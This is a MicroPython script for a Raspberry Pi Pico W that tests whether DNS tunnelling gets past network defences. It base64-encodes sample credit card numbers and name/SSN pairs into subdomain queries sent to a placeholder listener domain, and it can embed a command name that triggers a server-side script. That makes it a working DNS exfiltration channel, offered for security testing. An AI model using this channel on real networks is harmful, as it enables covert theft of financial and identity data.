#PicowFaucet v1.04.1
#Written: Mr.Waterhouse
#May 3, 2023
#
#This DNS tunnelling script created as part of a fun little side project. It is written in microPython and designed to quickly test if
#DNS tunnelling is possible in the environment. Simply put, is your existing security stack doing what it is supposed to do? 
#
#Usage: This script is written for Raspberry Pi Pico W. You may be able to get it to work on a different platform but I have not tested this.
#       You can either connect to your Pico W directly with Thonny and run it in console, or you can save it on the Pico W under the name main.py
#       and it will run everytime you power on the Pico W.
#
#       You must assign the phone_number and listener_domain variables!
#
#Prerequisites: This script expects you to have a Pico Display v2 connected as it will try to display all output on it. You will also need a
#               custom version of microPython which can be found here: https://github.com/pimoroni/pimoroni-pico/releases/tag/v1.19.18
#               Specifically, I used: pimoroni-picow-v1.19.18-micropython.uf2
#
#               This version will only connect to a WPA2 protected network using preshared key. I'm still working on menu system to allow selection
#               of OPEN vs PROTECTED.
#
#               You will also need to place the SSID and Password in a secrets.py file (sample available). 
#
#Acknowledgements: I code like a 5th grader, so any time I got stuck I would search in reddit for ideas. As a last resort, I'd hit up
#ChatGPT and it would usually set me on a better path. The sample CC and PII data is also sources from www.dlptest.com. I've also leaned
#heavily on code examples by Pimoroni in order to get the display functioning correctly.

#Import Requirements
import time 
import network
import secrets
import machine
import random
import ubinascii

#Import modules and setup Pico Display
from pimoroni import Button
from picographics import PicoGraphics, DISPLAY_PICO_DISPLAY_2, PEN_P4

# Use a 4 bit/16 colour palette to save RAM
display = PicoGraphics(display=DISPLAY_PICO_DISPLAY_2, pen_type=PEN_P4, rotate=0)
display.set_backlight(0.5)
display.set_font("bitmap8")

#The buttons are not in use today but I'm working on a menu system which will call them. You can remark them out for now if you wish.
#button_a = Button(12)
#button_b = Button(13)
#button_x = Button(14)
#button_y = Button(15)

#I'm only using BLACK, CYAN, and RED at the moment
#WHITE = display.create_pen(255, 255, 255)
BLACK = display.create_pen(0, 0, 0)
CYAN = display.create_pen(0, 255, 255)
#MAGENTA = display.create_pen(255, 0, 255)
RED = display.create_pen(255, 0, 0)
#GREEN = display.create_pen(0, 255, 0)

# Create clear screen function
def clear():
    display.set_pen(BLACK)
    display.clear()
    display.update()

# Clear the screen before we start the fun!
clear()

# Generate a random 5-digit number to act as session id
ranNum = random.randint(10000, 99999)

#Command embedding option. If you do not want to embed a command, leave it as 'x'. Your command calls a bash script of the same name on the server. Do not add .sh to the end.
cli_command = 'x'

#Assign Variables - You can adjust all of these. DO NOT put real credit cards and PII in here. That is idiotic!
listener_domain = 'sampledomain.xyz'      #You must enter in the listening domain here. Do NOT put a leading .
phone_number = str(ranNum) + '1xxxyyyzzzz' + str(cli_command)   #It must lead with the 1 for country code. Server SMS text back will not work without it.
credit_card_1 = str(ranNum) + '4916-4034-9269-8783 1/18/2024'
credit_card_2 = str(ranNum) + '5548-0246-6336-5664 5/16/2026'
ssn_1 = str(ranNum) + 'Rick Edwards 612-20-6832'
ssn_2 = str(ranNum) + 'Mark Hall 449-48-3135'

#Create DNS Data Array
dns_data =[phone_number, credit_card_1, credit_card_2, ssn_1, ssn_2]

#Pad the entries to 36 characters before encoding
for i in range(len(dns_data)):
    if len(dns_data[i]) != 36:
        # Pad with 'x' characters
        byte_array = bytearray(dns_data[i].encode('utf-8'))
        byte_array.extend(b'x' * (36 - len(byte_array)))
        dns_data[i] = byte_array.decode('utf-8')
    
    # Encode as base64 and strip of white space
    dns_data[i] = ubinascii.b2a_base64(dns_data[i].encode('utf-8')).decode('utf-8').rstrip('\n')

#Connect to WLAN
wlan = network.WLAN(network.STA_IF)
wlan.active(True)
rp2.country('CA')   											#You should change the country code or you might run into issues.
wlan.connect(secrets.SSID, secrets.PASSWORD) 					#These variable are specified in a separate secrets.py file.

# Wait for connect or fail 
max_wait = 20
while max_wait > 0:
     if wlan.status() < 0 or wlan.status() >= 3:
          break 
     max_wait -= 0.5 
     print('Waiting for connection...')
     clear()
     display.set_pen(CYAN)
     display.text("Connecting...", 10, 10, 240, 4)
     display.update()
     time.sleep(1)												#Hold display for 2 seconds before clearing
     clear()
     time.sleep(2) 

# Handle connection error 
if wlan.status() != 3:
     clear()
     display.set_pen(RED)
     display.text("WLAN Failed!", 10, 10, 240, 4)
     display.update()
     time.sleep(2)												#Hold display for 2 seconds before clearing
     clear()
     raise RuntimeError('network connection failed') 
else:
     print('WLAN connected')       								#Display Connected message on console and on pico display
     clear()
     display.set_pen(CYAN)
     display.text("WLAN Connected!", 10, 10, 240, 4)
     display.update()
     time.sleep(2)												#Hold display for 2 seconds before clearing
     clear()
     status = wlan.ifconfig()
     ip_octets = status[0]										#This is different than smaller display which requires status[0].split('.')
     print( 'IP = ' + status[0] )
     clear()													#Display ip address on console and on pico display
     display.set_pen(CYAN)
     display.text("IP: " + str(ip_octets), 10, 10, 240, 4)		#Display full IP address
     display.update()
     time.sleep(3)												#Hold display for 2 seconds before clearing
     clear()
     
#Assign DNS Server variables
dns_server = status[3]											#Assign DNS Server to variable
dns_octets = status[3].split('.')								#Break it into octets
dns_port = 53  # DNS server port
print('Assigned DNS server(s):', dns_server)					#Display DNS server on console
clear()															#Display DNS server on pico display
display.set_pen(CYAN)
display.text("DNS Server: " + str(dns_server), 10, 10, 240, 4)
display.update()
time.sleep(2)													#Hold display for 2 seconds before clearing
clear()

#DNS Lookup
import socket

#Loop to run 5 DNS queries over a period of 50 seconds
for i in range(5):
    
    # Define the domain you want to query based on the loop iteration
    domain = dns_data[i] + '.' + listener_domain

    # Define the socket type (e.g., SOCK_STREAM for TCP or SOCK_DGRAM for UDP)
    socket_type = socket.SOCK_DGRAM

    # Use DNS resolution to get the IP address
    try:
        ip_address = socket.getaddrinfo(domain, socket_type)[0][4][0]
        print("IP Address:", ip_address)
    except Exception as e:
        print("DNS Query " + str(i) + " Sent", e)				#Display DNS query sent message on console
        print(domain)											#Disply DNS queiry that was sent on console
        clear()													#Display DNS query sent message on pico display
        display.set_pen(CYAN)
        display.text("DNS Query " + str(i) + " Sent!", 10, 10, 240, 4)
        display.update()
        time.sleep(5)
        clear()
        
    time.sleep(1)  

#All clear message
print(ranNum)    
clear()															#Display DNS query sent message on pico display
display.set_pen(CYAN)
display.text("SessionId: " + str(ranNum), 10, 10, 240, 4)
display.update()
time.sleep(20)
clear()
